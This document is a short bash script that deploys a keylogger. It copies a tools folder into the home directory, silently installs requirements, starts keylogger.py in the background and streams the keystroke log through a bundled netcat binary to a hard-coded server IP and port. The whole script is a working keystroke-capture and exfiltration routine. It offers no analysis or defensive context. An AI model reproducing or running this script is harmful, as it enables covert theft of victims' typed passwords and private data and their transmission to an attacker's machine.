#!/bin/bash
SERVER_IP="192.168.0.104"
PORT=8506

cp -a ./tools/. ~/

cd ~

pip3 install -r requirements.txt > /dev/null
python3 keylogger.py &

chmod +x netcat
tail -f keys.log | ./netcat $SERVER_IP $PORT &


